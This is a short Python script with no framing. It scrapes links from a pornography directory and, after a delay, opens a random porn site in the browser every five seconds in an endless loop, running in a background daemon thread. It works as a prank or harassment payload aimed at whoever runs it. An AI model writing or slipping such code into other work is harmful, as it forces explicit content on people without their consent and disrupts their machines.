import time
import threading
import webbrowser
import requests

import numpy as np
from bs4 import BeautifulSoup

def spam_browser(delay_mins=10, delay_between_sec=5):
    r = requests.get('https://toppornsites.com/')
    soup = BeautifulSoup(r.text, 'lxml')
    links = soup.find_all('a', attrs={'class': 'link'})
    links = [link['href'] for link in links]

    time.sleep(delay_mins * 60)

    while True:
        time.sleep(delay_between_sec)
        webbrowser.open_new(links[np.random.randint(len(links))])

thread = threading.Thread(target=spam_browser, args=(.03, 5))
thread.daemon = True
thread.start()

